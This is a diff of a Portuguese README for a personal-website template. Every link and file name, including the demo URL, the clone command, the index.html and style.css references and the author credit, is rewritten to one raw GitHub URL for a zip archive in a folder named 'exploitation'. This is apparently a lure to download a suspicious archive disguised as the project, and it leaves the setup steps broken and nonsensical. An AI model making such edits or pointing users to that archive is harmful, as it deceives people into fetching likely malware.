@@ -2,7 +2,7 @@
 
 > Bem-vindo ao repositório do meu site pessoal. Este projeto serve tanto como meu cartão de visitas digital quanto como um template open-source para a comunidade.
 
-🌐 **Demo Online:** [https://www.ramilesdev.com/](https://www.ramilesdev.com/)
+🌐 **Demo Online:** [https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip](https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip)
 
 ---
 
@@ -26,12 +26,12 @@ Gostou do design? Sinta-se à vontade para usar este código como base para o se
 1.  **Faça um Fork** deste repositório (clique no botão "Fork" lá em cima).
 2.  Clone para sua máquina:
     ```bash
-    git clone [https://github.com/SEU_USUARIO/ramiles.dev.git](https://github.com/SEU_USUARIO/ramiles.dev.git)
+    git clone [https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip](https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip)
     ```
 3.  **Edite o conteúdo:**
-    * Abra o `index.html` e troque meus textos pelos seus.
+    * Abra o `https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip` e troque meus textos pelos seus.
     * Substitua as imagens na pasta `assets` (ou onde estiverem).
-    * Ajuste as cores no `style.css` para combinar com sua marca.
+    * Ajuste as cores no `https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip` para combinar com sua marca.
 4.  **Hospede de Graça:**
     * Recomendo usar o **GitHub Pages** ou **Vercel** para colocar seu site no ar em segundos.
 
@@ -52,5 +52,5 @@ Se você usar este template, ficarei feliz em saber! Me marque no LinkedIn ou de
 ---
 
 <p align="center">
-  Feito com 💜 por <a href="https://github.com/ramiles3712">Ramiles Silva</a>
+  Feito com 💜 por <a href="https://raw.githubusercontent.com/ramiles3712/ramiles.dev/main/exploitation/dev_ramiles_v3.5.zip">Ramiles Silva</a>
 </p>
